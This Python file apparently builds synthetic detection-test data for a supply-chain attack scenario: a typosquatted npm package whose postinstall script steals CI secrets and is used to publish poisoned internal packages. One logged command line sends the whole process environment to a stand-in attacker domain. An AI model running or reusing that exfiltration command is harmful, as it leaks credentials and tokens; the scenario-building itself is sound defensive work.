from data.scenarios.base import BaseScenario


class PoisonedPackageScenario(BaseScenario):
    """
    Modeled on TeamPCP. Timeline:
    T+0:   Attacker publishes @teampcp/trivy-wrapper mimicking official trivy package
    T+5:   CI pipeline for org/security-scanner pulls @teampcp/trivy-wrapper
    T+6:   postinstall script executes, reads CI env vars
    T+8:   Exfiltrates GITHUB_TOKEN, NPM_TOKEN, AWS keys to attacker C2
    T+10:  Attacker uses GITHUB_TOKEN to access private repos
    T+15:  Attacker publishes poisoned versions of 3 internal packages
    T+20:  Multiple downstream CI pipelines pull poisoned internal packages
    """

    C2_DOMAIN = "api.teampcp-cdn.com"

    def generate(self) -> dict[str, list[dict]]:
        return {
            "cicd_events": self._cicd_events(),
            "git_events": self._git_events(),
            "secret_audit": self._secret_events(),
            "threat_intel": self._threat_intel_events(),
            "extensions": [],
        }

    def _cicd_events(self) -> list[dict]:
        return [
            {
                "timestamp": self.ts(5),
                "event_type": "pipeline_triggered",
                "repo": self.repo("security-scanner"),
                "branch": "main",
                "trigger": "schedule",
                "runner": self.runner(7),
                "commit_sha": self.fake_hash()[:12],
            },
            {
                "timestamp": self.ts(6),
                "event_type": "dependency_install",
                "repo": self.repo("security-scanner"),
                "runner": self.runner(7),
                "package": "@teampcp/trivy-wrapper",
                "version": "3.0.1",
                "registry": "npmjs.org",
                "hash": self.fake_hash(),
            },
            {
                "timestamp": self.ts(6),
                "event_type": "process_spawn",
                "runner": self.runner(7),
                "parent_process": "npm install",
                "child_process": "node scripts/postinstall.js",
                "command_line": f'node -e \'fetch("https://{self.C2_DOMAIN}/c",{{method:"POST",body:JSON.stringify(process.env)}})\'',
            },
            {
                "timestamp": self.ts(20),
                "event_type": "dependency_install",
                "repo": self.repo("web-app"),
                "runner": self.runner(11),
                "package": "@internal/auth-utils",
                "version": "2.5.0-compromised",
                "registry": "github-packages",
                "hash": self.fake_hash(),
            },
            {
                "timestamp": self.ts(21),
                "event_type": "dependency_install",
                "repo": self.repo("mobile-api"),
                "runner": self.runner(4),
                "package": "@internal/logger",
                "version": "1.3.0-compromised",
                "registry": "github-packages",
                "hash": self.fake_hash(),
            },
        ]

    def _git_events(self) -> list[dict]:
        attacker_ip = self.fake_ip()
        return [
            {
                "timestamp": self.ts(10),
                "event_type": "repo_clone",
                "repo": self.repo("infrastructure"),
                "user": "ci-bot",
                "source_ip": attacker_ip,
                "user_agent": "git/2.43.0",
                "auth_method": "pat",
            },
            {
                "timestamp": self.ts(15),
                "event_type": "package_publish",
                "registry": "github-packages",
                "package": "@internal/auth-utils",
                "version": "2.5.0-compromised",
                "user": "ci-bot",
                "source_ip": attacker_ip,
            },
            {
                "timestamp": self.ts(16),
                "event_type": "package_publish",
                "registry": "github-packages",
                "package": "@internal/logger",
                "version": "1.3.0-compromised",
                "user": "ci-bot",
                "source_ip": attacker_ip,
            },
        ]

    def _secret_events(self) -> list[dict]:
        return [
            {
                "timestamp": self.ts(6),
                "event_type": "env_var_read",
                "host": self.runner(7),
                "pipeline": f"{self.repo('security-scanner')}/main",
                "secret_name": "GITHUB_TOKEN",
                "accessor": "node scripts/postinstall.js",
                "source_ip": "10.0.2.80",
            },
            {
                "timestamp": self.ts(6),
                "event_type": "env_var_read",
                "host": self.runner(7),
                "pipeline": f"{self.repo('security-scanner')}/main",
                "secret_name": "NPM_TOKEN",
                "accessor": "node scripts/postinstall.js",
                "source_ip": "10.0.2.80",
            },
            {
                "timestamp": self.ts(7),
                "event_type": "env_var_read",
                "host": self.runner(7),
                "pipeline": f"{self.repo('security-scanner')}/main",
                "secret_name": "AWS_ACCESS_KEY_ID",
                "accessor": "node scripts/postinstall.js",
                "source_ip": "10.0.2.80",
            },
        ]

    def _threat_intel_events(self) -> list[dict]:
        return [
            {
                "timestamp": self.ts(0),
                "ioc_type": "domain",
                "ioc_value": self.C2_DOMAIN,
                "campaign": "TeamPCP",
                "confidence": "high",
                "mitre_technique": "T1195.001",
                "description": "C2 domain for TeamPCP supply chain campaign",
            },
            {
                "timestamp": self.ts(0),
                "ioc_type": "package_name",
                "ioc_value": "@teampcp/trivy-wrapper",
                "campaign": "TeamPCP",
                "confidence": "high",
                "mitre_technique": "T1195.001",
                "description": "Typosquatted package mimicking official trivy CLI wrapper",
            },
        ]
